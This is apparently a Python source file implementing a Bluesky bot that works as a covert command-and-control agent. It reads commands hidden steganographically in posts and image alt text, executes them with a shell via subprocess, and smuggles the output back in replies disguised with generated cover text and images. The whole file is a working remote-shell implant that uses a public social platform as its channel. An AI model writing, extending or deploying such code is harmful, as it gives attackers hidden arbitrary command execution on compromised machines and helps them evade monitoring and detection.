import time
import os
import subprocess
from datetime import datetime, timezone

from dotenv import load_dotenv

from core.bsky_client import BskyClient, MyPost  # Import the BskyClient class from your script
from core.text_stegano import TextStegano
from core.header_serializer import HeaderSerializer
from core.data_serializer import DataSerializer
from core.text_generator import TextGenerator
from core.dummy_text_generator import DummyTextGenerator
from core.image_path_generator import ImagePathGenerator
from core.dummy_image_path_generator import DummyImagePathGenerator
from core.image_processor import ImageProcessor

class Bot:
    def __init__(self, bsky_client: BskyClient, text_generator: TextGenerator, image_path_generator: ImagePathGenerator):
        self.client = bsky_client
        self.text_generator = text_generator
        self.image_path_generator = image_path_generator
        
        self.interval = 1
        self.start_time = datetime.now(timezone.utc)
        self.latest_seen_post_time = None

    def _callback(self):
        """
        Gets processed every interval iteration. Ahoj.

        The bot processes a post only if:
        - The post was created after the bot started.
        - The post is newer than the most recent post it has already seen.
        """
        latest_posts = self.client.read_posts_latest(limit=1)

        for post in latest_posts:
            post_time = datetime.strptime(post.created, '%Y-%m-%dT%H:%M:%S.%f%z')

            if post_time > self.start_time and (not self.latest_seen_post_time or post_time > self.latest_seen_post_time):
                print("Request recorded.")
                self._respond(post)
                print("Waiting for a request.")
                self.latest_seen_post_time = post_time

    def _respond(self, post: MyPost):
        """
        React to a post by decoding its text and processing the contained Linux command.

        Parameters:
        post (MyPost): The post to react to.
        """
        try:
            # Step 0: Validate that the post contains the required fields
            if not post.text or not post.image_alt:
                raise ValueError("Post is missing required text or image_alt fields.")

            # Step 1: Decode header from the post text and data from image_alt
            decoded_header = TextStegano.decode(post.text)
            req_header = HeaderSerializer.deserialize(decoded_header)
            req_data = DataSerializer.deserialize_string([post.image_alt])

            # Step 2: Execute the Linux command from the decoded data
            try:
                command_output = subprocess.check_output(req_data, shell=True, text=True)
            except subprocess.CalledProcessError as e:
                command_output = "COMMAND-FAILED"  # Handle cases where the command fails
            if command_output == "" or command_output is None:
                command_output = "NO-CONTENT"

            # Step 3: Serialize the command output
            res_datas = DataSerializer.serialize_string(command_output, 2000)

            # Step 4: Create response headers for each serialized output part
            res_headers = [
                TextStegano.encode(
                    self.text_generator.generate(),
                    HeaderSerializer.serialize(
                        id=req_header["id"],
                        type="res",
                        curr_post=index + 1,
                        total_posts=len(res_datas)
                    )
                ) for index in range(len(res_datas))
            ]

            # Step 5: Reply to the post for each serialized output part
            for index, [header, data_part] in enumerate(zip(res_headers, res_datas)):
                image_path = self.image_path_generator.generate()
                ImageProcessor.compress_bsky(image_path, "./tmp.jpg", 500)
                self.client.create_reply(
                    root=post,
                    parent=post,
                    text=header,
                    image_path="./tmp.jpg",
                    image_alt=data_part
                )
                print(f"Sent partition {index+1}/{len(res_headers)}")

            print(f"Replied to post {post.uri} with processed command output.")

        except Exception as e:
            print(f"Error processing post {post.uri}: {e}")

    def start(self):
        """Start monitoring posts."""

        print("Bot is running. Press Ctrl+C to stop.")
        while True:
            try:
                self._callback()
            except Exception as e:
                print(f"Error dispatching request: {e}")

            time.sleep(self.interval)

if __name__ == "__main__":
    load_dotenv()
    
    handle = os.getenv("BSKY_LOGIN")
    password = os.getenv("BSKY_PASSWORD")
    did = os.getenv("BSKY_DID")
    
    bsky_client = BskyClient(handle, password, did)
    
    text_generator = DummyTextGenerator()
    
    image_path_generator = DummyImagePathGenerator("image_db")
    
    bot = Bot(bsky_client, text_generator, image_path_generator)
    bot.start()
